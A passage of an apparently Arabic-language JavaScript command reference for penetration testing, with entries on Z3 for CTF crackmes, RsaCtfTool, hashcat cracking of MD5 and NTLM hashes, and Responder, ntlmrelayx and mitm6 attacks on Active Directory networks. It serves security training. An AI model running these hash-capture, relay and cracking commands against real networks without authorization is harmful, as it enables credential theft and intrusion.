    { cmd: `from z3 import *
flag = [BitVec(f'c{i}', 8) for i in range(10)]
s = Solver()
# إضافة قيود من الكود المعكوس
s.add(flag[0] ^ 0x42 == ord('K'))
if s.check() == sat: print(bytes([s.model()[c].as_long() for c in flag]))`, desc: 'استخراج flag من CTF crackme' },
  ],
  tips: '💡 Z3 ممتاز لـ reversing challenges حيث توجد قيود رياضية.',
  related: ['angr', 'pwntools', 'ghidra'],
},
{
  id: 1227, name: 'rsactftool', cat: 'ctf', level: 'intermediate',
  syntax: 'python3 RsaCtfTool.py [OPTIONS]',
  short: 'كسر تشفير RSA الضعيف في CTF',
  desc: `RsaCtfTool يكسر تشفير RSA الضعيف في مسائل CTF. يستخدم هجمات عديدة: factorization، small e، common factor، Wiener's attack وغيرها.`,
  options: [
    { flag: '--publickey FILE', desc: 'المفتاح العام' },
    { flag: '--private', desc: 'استخراج المفتاح الخاص' },
    { flag: '--uncipher CIPHER', desc: 'فك التشفير' },
    { flag: '--attack all', desc: 'تجربة جميع الهجمات' },
  ],
  examples: [
    { cmd: 'python3 RsaCtfTool.py --publickey key.pub --private', desc: 'استخراج المفتاح الخاص' },
    { cmd: 'python3 RsaCtfTool.py --n N --e E --uncipher CIPHER', desc: 'فك تشفير مباشرة' },
    { cmd: 'python3 RsaCtfTool.py --publickey key.pub --attack wiener,fermat', desc: 'هجمات محددة' },
    { cmd: 'python3 -c "from Crypto.PublicKey import RSA; print(RSA.import_key(open(\'key.pub\').read()).n)"', desc: 'قراءة معاملات RSA' },
  ],
  tips: '💡 factordb.com قاعدة بيانات ضخمة للأعداد المحللة. تحقق منها أولاً.',
  related: ['z3-solver', 'pwntools', 'cyberchef-local'],
},

// ─── HASH CRACKING ─────────────────────────────────
{
  id: 1228, name: 'hash-cracking-workflow', cat: 'exploitation', level: 'intermediate',
  syntax: '# Complete hash cracking workflow',
  short: 'منهجية كاملة لكسر الهاشات',
  desc: `منهجية منهجية لكسر الهاشات: تحديد النوع، اختيار الأداة والهجوم المناسب، استخدام GPU للتسريع.`,
  options: [],
  examples: [
    { cmd: 'hashcat --identify hash.txt  # تحديد نوع الهاش\nhashid hash.txt\nhash-identifier', desc: 'تحديد نوع الهاش' },
    { cmd: '# MD5 dictionary:\nhashcat -a 0 -m 0 hash.txt rockyou.txt\n# MD5 bruteforce (6 chars):\nhashcat -a 3 -m 0 hash.txt ?a?a?a?a?a?a', desc: 'هجوم قاموس وـ bruteforce' },
    { cmd: '# Rules attack (أقوى):\nhashcat -a 0 -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule', desc: 'هجوم rules لتوليد تنويعات' },
    { cmd: '# NTLM (Windows):\nhashcat -a 0 -m 1000 hash.txt rockyou.txt\n# Net-NTLMv2:\nhashcat -a 0 -m 5600 hash.txt rockyou.txt', desc: 'كسر هاشات Windows' },
  ],
  tips: '💡 استخدم --show بعد انتهاء الجلسة لعرض الهاشات المكسورة من الـ potfile.',
  related: ['hashcat', 'john', 'hydra'],
},

// ─── MISC TOOLS ────────────────────────────────────
{
  id: 1229, name: 'responder', cat: 'network', level: 'advanced',
  syntax: 'sudo responder -I INTERFACE [OPTIONS]',
  short: 'اختطاف بروتوكولات الشبكة للحصول على هاشات',
  desc: `Responder يستجيب لطلبات NBNS وLLMNR وmDNS في الشبكة المحلية لاختطاف هاشات NTLMv2. من أقوى أدوات الهجوم الداخلي.`,
  options: [
    { flag: '-I IFACE', desc: 'واجهة الشبكة' },
    { flag: '-w', desc: 'WPAD proxy server' },
    { flag: '-b', desc: 'Basic HTTP auth' },
    { flag: '-v', desc: 'verbose' },
  ],
  examples: [
    { cmd: 'sudo responder -I eth0 -wv', desc: 'تشغيل Responder لاختطاف الهاشات' },
    { cmd: '# الهاشات تُحفظ في /usr/share/responder/logs/\ncat /usr/share/responder/logs/*.txt', desc: 'عرض الهاشات المختطفة' },
    { cmd: 'hashcat -m 5600 hash.txt rockyou.txt', desc: 'كسر NTLMv2 hash' },
    { cmd: 'sudo ntlmrelayx.py -tf targets.txt -smb2support', desc: 'إضافة: ntlmrelayx للـ relay' },
  ],
  tips: '💡 اجمع Responder مع ntlmrelayx لـ NTLM Relay Attack.',
  related: ['hashcat', 'crackmapexec', 'impacket-secretsdump'],
},
{
  id: 1230, name: 'mitm6', cat: 'network', level: 'advanced',
  syntax: 'sudo mitm6 -d DOMAIN',
  short: 'MITM هجوم عبر IPv6 في شبكات Active Directory',
  desc: `mitm6 يستغل بروتوكول IPv6 لتنفيذ MITM في شبكات Windows. يعمل كـ DHCPv6 server مزيف لاختطاف DNS وتوجيه الحركة.`,
  options: [
    { flag: '-d DOMAIN', desc: 'اسم domain الهدف' },
    { flag: '-i IFACE', desc: 'واجهة الشبكة' },
  ],
  examples: [
    { cmd: 'sudo mitm6 -d corp.local', desc: 'تشغيل mitm6' },
    { cmd: '# في نافذة أخرى:\nsudo ntlmrelayx.py -6 -t smb://DC_IP -wh fake-wpad -l /tmp/loot', desc: 'ربط mitm6 مع ntlmrelayx' },
    { cmd: '# انتظر أجهزة تسجيل دخول للحصول على credentials', desc: 'انتظار الاصطياد' },
  ],
  tips: '💡 mitm6 + ntlmrelayx من أخطر الهجمات على Active Directory.',
  related: ['responder', 'crackmapexec', 'impacket-secretsdump'],
},
];

window.CMD_PART12 = CMD_PART12;
console.log(`✅ CMD_PART12 loaded: ${CMD_PART12.length} commands`);
